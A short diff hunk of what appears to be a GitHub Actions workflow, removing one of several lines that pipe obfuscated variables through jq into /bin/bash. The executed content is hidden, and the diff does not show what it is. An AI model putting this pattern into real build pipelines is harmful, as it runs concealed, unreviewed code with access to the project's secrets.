@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$fpv6426" | jq -r .ybh78679 | /bin/bash
           echo $ndb98 | jq -r .ba1 | /bin/bash
           echo $dxkqr91117 | jq -r .zp5 | /bin/bash
-          echo $h58 | jq -r .bbd49 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
